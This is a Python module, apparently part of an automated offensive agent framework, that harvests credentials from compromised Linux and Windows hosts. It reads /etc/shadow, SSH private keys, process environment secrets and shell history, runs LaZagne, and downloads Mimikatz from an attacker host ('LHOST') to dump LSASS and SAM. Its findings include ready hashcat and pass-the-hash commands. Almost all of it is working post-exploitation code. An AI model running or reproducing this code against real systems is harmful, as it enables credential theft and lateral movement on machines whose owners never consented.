"""
local_cred_harvest_subagent.py — Local credential harvesting from compromised hosts.

AGENT_NAME  : "post"
SUBAGENT_NAME: "local_cred_harvest"

Linux methodology:
  1. /etc/shadow (if readable) — store SHA-512/bcrypt hashes for cracking
  2. /proc/[pid]/environ — search for credentials in running process env vars
  3. bash history / zsh history — commands containing passwords
  4. SSH private keys in /root and /home/*
  5. secretsdump (if impacket available) via NTDS or SAM+SYSTEM
  6. LaZagne — Linux credential recovery

Windows methodology:
  1. Mimikatz sekurlsa::logonpasswords — LSASS credential dump
  2. Mimikatz lsadump::sam — SAM database dump
  3. Mimikatz lsadump::dcsync — DC Sync for NTDS
  4. DPAPI credential decryption (browser, credential manager)
  5. reg save HKLM\\SAM + HKLM\\SYSTEM offline dump
  6. LaZagne.exe — all credential providers
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_HASH_LINUX_RE = re.compile(r"(\$[1-6y]\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{22,})", re.IGNORECASE)
_NTLM_HASH_RE = re.compile(r"([0-9a-f]{32}:[0-9a-f]{32})", re.IGNORECASE)
_LSASS_CRED_RE = re.compile(r"Username\s*:\s*(\S+).*Password\s*:\s*(\S+)", re.IGNORECASE | re.DOTALL)
_PASSWORD_HIST_RE = re.compile(
    r"(-p\s+|--password[=\s]+|password\s*=\s*|passwd\s+)(['\"]?)(\S{4,})\2",
    re.IGNORECASE,
)
_SSH_KEY_RE = re.compile(r"BEGIN.*PRIVATE KEY", re.IGNORECASE)
_ENV_CRED_RE = re.compile(
    r"(PASSWORD|SECRET|TOKEN|API_KEY|ACCESS_KEY)\s*=\s*([^\x00\n]{4,50})",
    re.IGNORECASE,
)


class LocalCredHarvestSubagent(BaseSubagent):
    """Harvest credentials from local system stores and memory."""

    AGENT_NAME: str = "post"
    SUBAGENT_NAME: str = "local_cred_harvest"

    async def run(self, target: str, os_type: str = "linux", **kwargs: Any) -> SubagentResult:
        """
        Harvest local credentials.

        Parameters
        ----------
        target:
            Compromised host IP or hostname.
        os_type:
            ``"linux"`` or ``"windows"``.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        if os_type.lower() == "windows":
            await self._harvest_windows(target)
        else:
            await self._harvest_linux(target)

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ------------------------------------------------------------------
    # Linux credential harvest
    # ------------------------------------------------------------------

    async def _harvest_linux(self, target: str) -> None:
        """Harvest credentials from Linux system."""

        # ── 1. /etc/shadow ────────────────────────────────────────────────
        shadow_output = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"cat /etc/shadow 2>/dev/null\""},
        )

        hash_lines = []
        for line in shadow_output.splitlines():
            parts = line.split(":")
            if len(parts) >= 2 and parts[1] not in ("!", "*", "", "x") and "$" in parts[1]:
                hash_lines.append(line)

        if hash_lines:
            hash_count = len(hash_lines)
            hash_types = set()
            for hl in hash_lines:
                h = hl.split(":")[1]
                if h.startswith("$6$"): hash_types.add("SHA-512")
                elif h.startswith("$5$"): hash_types.add("SHA-256")
                elif h.startswith("$1$"): hash_types.add("MD5")
                elif h.startswith("$2"): hash_types.add("bcrypt")
                elif h.startswith("$y$"): hash_types.add("yescrypt")

            await self.store_finding(Finding(
                title=f"Credential Harvest: {hash_count} Password Hash(es) from /etc/shadow",
                description=(
                    f"Successfully read /etc/shadow and extracted {hash_count} password hash(es). "
                    f"Hash types: {', '.join(hash_types) or 'unknown'}. "
                    "Crack offline with hashcat or john the ripper."
                ),
                severity="CRITICAL",
                evidence="\n".join(hash_lines[:10]),
                tool="bash",
                host=target,
                mitre_technique="T1003.008",
                exploit_suggestion=(
                    "Save hashes to file, then crack:\n"
                    "  SHA-512 ($6$): hashcat -m 1800 hashes.txt rockyou.txt\n"
                    "  bcrypt ($2a/$2b): hashcat -m 3200 hashes.txt rockyou.txt\n"
                    "  john --wordlist=rockyou.txt --format=sha512crypt hashes.txt"
                ),
            ))

        # ── 2. SSH private keys ───────────────────────────────────────────
        ssh_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o "
                "-name 'id_ecdsa' -o -name 'id_dsa' 2>/dev/null\""
            )},
        )

        key_files = [l.strip() for l in ssh_output.splitlines() if l.strip()]
        for kf in key_files[:5]:
            key_content = await self.collect_tool(
                "bash",
                target,
                {"options": f"-c \"cat '{kf}' 2>/dev/null\""},
            )
            if _SSH_KEY_RE.search(key_content):
                encrypted = "ENCRYPTED" in key_content or "Proc-Type" in key_content
                await self.store_finding(Finding(
                    title=f"Credential Harvest: SSH Private Key — {kf}",
                    description=(
                        f"SSH private key found at {kf}. "
                        f"Key is {'password-protected (crackable with ssh2john)' if encrypted else 'unencrypted (direct use)'}. "
                        "Use to authenticate as the key owner to other SSH-enabled systems."
                    ),
                    severity="CRITICAL" if not encrypted else "HIGH",
                    evidence=key_content[:500],
                    tool="bash",
                    host=target,
                    mitre_technique="T1552.004",
                    exploit_suggestion=(
                        f"{'Direct use: ' if not encrypted else 'Crack passphrase: ssh2john ' + kf + ' | john --wordlist=rockyou.txt; then use: '}"
                        f"ssh -i {kf} user@other_host"
                    ),
                ))

        # ── 3. Process environment variable credential scan ───────────────
        proc_env_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"for pid in $(ls /proc | grep -E '^[0-9]+$' | head -30); do "
                "cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | "
                "grep -iE '(PASSWORD|SECRET|TOKEN|API_KEY|ACCESS_KEY)' 2>/dev/null | "
                "sed \"s/^/PID $pid: /\"; done\""
            )},
        )

        env_matches = _ENV_CRED_RE.findall(proc_env_output)
        if env_matches:
            await self.store_finding(Finding(
                title=f"Credential Harvest: {len(env_matches)} Credential(s) in Process Environment",
                description=(
                    f"Found {len(env_matches)} credential variable(s) in running process environments. "
                    "Applications often pass credentials via environment variables to avoid storing "
                    "them in config files."
                ),
                severity="HIGH",
                evidence=proc_env_output[:1000],
                tool="bash",
                host=target,
                mitre_technique="T1552.001",
                exploit_suggestion=(
                    "Cross-reference with service names to identify the credential owner. "
                    "Test credentials against all discovered services."
                ),
            ))

        # ── 4. Shell history files ────────────────────────────────────────
        history_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"cat /root/.bash_history /root/.zsh_history "
                "/home/*/.bash_history /home/*/.zsh_history 2>/dev/null | "
                "grep -iE '(-p |--password|passwd |sshpass|mysql -p|mysql -u.*-p|curl.*:.*@|wget.*:.*@)' | "
                "head -30\""
            )},
        )

        hist_creds = _PASSWORD_HIST_RE.findall(history_output)
        if hist_creds or history_output.strip():
            await self.store_finding(Finding(
                title=f"Credential Harvest: Credentials Found in Shell History",
                description=(
                    f"Shell history files contain commands with embedded credentials. "
                    f"Found {len(hist_creds)} password pattern(s) in history. "
                    "Users frequently type passwords on the command line which persist in history."
                ),
                severity="HIGH",
                evidence=history_output[:1000],
                tool="bash",
                host=target,
                mitre_technique="T1552.003",
                exploit_suggestion=(
                    "Extract plaintext passwords from history and test against "
                    "all services: SSH, MySQL, sudo, web apps."
                ),
            ))

        # ── 5. LaZagne for Linux ──────────────────────────────────────────
        lazagne_output = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"python3 /tmp/lazagne.py all 2>/dev/null || lazagne all 2>/dev/null\""},
        )

        if "password" in lazagne_output.lower() and len(lazagne_output) > 100:
            await self.store_finding(Finding(
                title="Credential Harvest: LaZagne Multi-Provider Credential Recovery",
                description=(
                    "LaZagne successfully recovered credentials from one or more providers. "
                    "LaZagne checks SSH, browsers, databases, mail clients, and other apps."
                ),
                severity="HIGH",
                evidence=lazagne_output[:2000],
                tool="lazagne",
                host=target,
                mitre_technique="T1555",
                exploit_suggestion=(
                    "Categorize recovered credentials by type and test across all discovered services."
                ),
            ))

    # ------------------------------------------------------------------
    # Windows credential harvest
    # ------------------------------------------------------------------

    async def _harvest_windows(self, target: str) -> None:
        """Harvest credentials from Windows system using Mimikatz and reg save."""

        # ── 1. Mimikatz sekurlsa::logonpasswords ──────────────────────────
        mimi_logon_output = await self.collect_tool(
            "powershell",
            target,
            {"options": (
                "-Command \""
                "$mimi = [System.IO.Path]::GetTempFileName() + '.exe'; "
                "Invoke-WebRequest -Uri 'http://LHOST/mimikatz.exe' -OutFile $mimi -UseBasicParsing; "
                "& $mimi 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' 2>&1\""
            )},
        )

        lsass_creds = _LSASS_CRED_RE.findall(mimi_logon_output)
        ntlm_hashes = _NTLM_HASH_RE.findall(mimi_logon_output)

        if lsass_creds or ntlm_hashes or "logonPasswords" in mimi_logon_output:
            await self.store_finding(Finding(
                title=f"Credential Harvest: LSASS Dump — {len(lsass_creds)} Credential(s) + {len(ntlm_hashes)} NTLM Hash(es)",
                description=(
                    f"Mimikatz sekurlsa::logonpasswords dumped LSASS memory. "
                    f"Recovered {len(lsass_creds)} plaintext credential(s) and "
                    f"{len(ntlm_hashes)} NTLM hash(es). "
                    "These enable pass-the-hash and lateral movement."
                ),
                severity="CRITICAL",
                evidence=mimi_logon_output[:2000],
                tool="mimikatz",
                host=target,
                mitre_technique="T1003.001",
                exploit_suggestion=(
                    "Pass-the-hash: crackmapexec smb targets -u user -H <NTLM_HASH>. "
                    "Or use: impacket-psexec user@target -hashes LM:NT"
                ),
            ))

        # ── 2. SAM + SYSTEM registry save (offline dump) ─────────────────
        sam_output = await self.collect_tool(
            "cmd",
            target,
            {"options": (
                "/c reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y 2>&1 && "
                "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y 2>&1 && "
                "reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save /y 2>&1 && "
                "echo SAM_SAVE_SUCCESS"
            )},
        )

        if "SAM_SAVE_SUCCESS" in sam_output:
            await self.store_finding(Finding(
                title="Credential Harvest: SAM + SYSTEM Hive Saved for Offline Dump",
                description=(
                    "SAM, SYSTEM, and SECURITY registry hives saved to C:\\Windows\\Temp\\. "
                    "These files contain all local account NTLM hashes and can be "
                    "parsed offline with impacket-secretsdump or Mimikatz."
                ),
                severity="CRITICAL",
                evidence=sam_output[:500],
                tool="cmd",
                host=target,
                mitre_technique="T1003.002",
                exploit_suggestion=(
                    "Exfil and dump: impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL. "
                    "Or: mimikatz # lsadump::sam /system:system.save /sam:sam.save"
                ),
            ))

        # ── 3. LaZagne for Windows ────────────────────────────────────────
        lazagne_win = await self.collect_tool(
            "cmd",
            target,
            {"options": "/c C:\\Windows\\Temp\\lazagne.exe all 2>&1 | head -100"},
        )

        if "password" in lazagne_win.lower() and len(lazagne_win) > 100:
            await self.store_finding(Finding(
                title="Credential Harvest: LaZagne Windows Multi-Provider Recovery",
                description=(
                    "LaZagne.exe recovered credentials from Windows credential providers. "
                    "Checks browsers (Chrome, Firefox, IE), email clients, databases, "
                    "Git configs, WiFi passwords, and Windows Credential Manager."
                ),
                severity="HIGH",
                evidence=lazagne_win[:2000],
                tool="lazagne",
                host=target,
                mitre_technique="T1555",
                exploit_suggestion=(
                    "Categorize all recovered credentials. Test across all services "
                    "and attempt password reuse on domain accounts."
                ),
            ))

        # ── 4. Mimikatz lsadump::sam ──────────────────────────────────────
        mimi_sam = await self.collect_tool(
            "powershell",
            target,
            {"options": (
                "-Command \"& C:\\Windows\\Temp\\mimikatz.exe "
                "'privilege::debug' 'token::elevate' 'lsadump::sam' 'exit' 2>&1\""
            )},
        )

        sam_ntlm = _NTLM_HASH_RE.findall(mimi_sam)
        if sam_ntlm:
            await self.store_finding(Finding(
                title=f"Credential Harvest: SAM Database Dump — {len(sam_ntlm)} NTLM Hash(es)",
                description=(
                    f"Mimikatz lsadump::sam extracted {len(sam_ntlm)} NTLM hash(es) "
                    "from the local SAM database. Contains all local user account hashes. "
                    "Use for pass-the-hash or offline cracking."
                ),
                severity="CRITICAL",
                evidence=mimi_sam[:1500],
                tool="mimikatz",
                host=target,
                mitre_technique="T1003.002",
                exploit_suggestion=(
                    "Crack with: hashcat -m 1000 ntlm_hashes.txt rockyou.txt. "
                    "Pass-the-hash: impacket-psexec administrator@target -hashes :NTLM_HASH"
                ),
            ))
